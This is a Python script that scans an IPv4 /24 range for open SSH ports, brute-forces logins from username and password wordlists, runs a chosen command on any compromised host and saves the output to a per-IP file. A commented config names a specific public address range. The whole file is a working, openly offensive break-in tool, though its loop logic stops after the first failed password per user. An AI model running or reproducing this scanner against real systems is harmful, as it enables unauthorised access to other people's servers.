import configparser
import fire
import signal
import sys
from itertools import count
import paramiko
from socket import *

import time
from threading import Thread

# enable=true
# iprange=78.13.240
# userfile=sshusr.txt
# passwfile=sshpsw.txt
# linuxshellcode=whoami
# port=22
# max_thread=10
# timeout=3
ssh_scan = None
def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    global EXIT
    EXIT=True
    ssh_scan.stop()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


SSH_STATE = {"RUNNING":1,"END":0, "IDLE":2}

class SSHScan():

    def __init__(self, 
                 start_ip, 
                 end_ip, 
                 user_file, 
                 password_file,
                 ssh_port,
                 max_thread,
                 timeout,
                 command
                 ):

        
        self.start_ip = start_ip 
        self.end_ip = end_ip 
        self.user_ssh_file = user_file
        self.pass_ssh_file = password_file 
        self.user_list = []
        self.pass_list = []
        self.ssh_linux_shellcode = command 
        self.ssh_port = ssh_port 
        self.max_thread = max_thread 
        self.timeout = timeout 
        self.forced_exit = False
        self.thread_list = {}

    def _loadDictionary(self):
        ff = open(self.user_ssh_file, 'r')
        self.user_list = ff.readlines()
        ff.close()

        ff = open(self.pass_ssh_file, 'r')
        self.pass_list = ff.readlines()
        ff.close()

    def stop(self):
        self.forced_exit = True

    def hack_ssh(self):
        counter = 1
        print("Scanning for ssh services...")
        while counter < 254:
            if self.forced_exit:
                return

            if len(self.thread_list)>=self.max_thread:
                time.sleep(2)
            else:
                ip = self.start_ip+"."+str(counter)
                t = Thread(target=self._scan_ip, args=(ip,))
                t.start()
                self.thread_list[ip] = t

            counter = counter+1

        while len(self.thread_list)>0:
            time.sleep(3)
        print("Done!")

    def _scan_ip(self, ip):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        if self.forced_exit:
            return

        connSkt = None
        try:
            connSkt = socket(AF_INET, SOCK_STREAM)
            connSkt.settimeout(self.timeout)
            connSkt.connect((ip, self.ssh_port))
            print("[+] {}:{} open".format(ip,self.ssh_port))
        
        except:
            connSkt.close()
            try:
                del self.thread_list[ip]
            except:
                pass
            return
        finally:
            connSkt.close()
            
    

        for user in self.user_list:
            if self.forced_exit:
                return
            user = user.strip("\n")
            for psw in self.pass_list:
                if self.forced_exit:
                    return
                psw=psw.strip("\n")

                try:
                    print("Cracking SSH account ({}/{})...".format(user,psw))
                    ssh.connect(ip, self.ssh_port, user, psw,timeout=self.timeout)
                    print("Sending command: {}".format(self.ssh_linux_shellcode)) 
                    stdin, stdout, stderr = ssh.exec_command(self.ssh_linux_shellcode)

                    
                    output=stdout.readlines()
                    print(output)

                    print("Close connection") 
                    ssh.close()
                    
                    ww = open(ip+".txt",'w')
                    for line in output:
                        ww.write(line)
                    ww.close()


                    del self.thread_list[ip]
                    return
                except (paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.SSHException):
                    ssh.close()
                    break
                except:
                    #print("Skip {}".format(ip))

                    del self.thread_list[ip]
                    return
        del self.thread_list[ip]
        

def scan(start_ip,
        end_ip,
        user_file,
        password_file, 
        port=22, 
        max_thread=10, 
        timeout=3, 
        command=None):
    global ssh_scan 
    ssh_scan = SSHScan(start_ip,
                       end_ip,
                       user_file,
                       password_file,
                       port,
                       max_thread,
                       timeout,
                       command)


    ssh_scan._loadDictionary()
    ssh_scan.hack_ssh()

if __name__ == '__main__':
  fire.Fire({'scan':scan})